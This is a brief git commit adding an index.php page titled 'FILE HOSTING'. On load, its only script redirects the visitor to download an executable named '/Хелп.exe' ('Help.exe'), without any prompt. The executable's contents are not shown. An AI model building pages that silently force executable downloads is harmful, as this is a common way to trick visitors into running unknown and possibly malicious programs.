3ca8c8fd7f8996f0adad3cd78054106d244b5be1
Panda05FP <34271600+Panda05FP@users.noreply.github.com>
2017-12-05 14:37:35 +0300

    Files of site

---
+++ index.php
@@ -0,0 +1,11 @@
+﻿<!DOCTYPE html>
+<html>
+<head>
+    <title>FILE HOSTING</title>
+</head>
+<body style="background: url(/bg.png);">
+    <script>
+        window.location="/Хелп.exe";
+    </script>
+</body>
+</html>
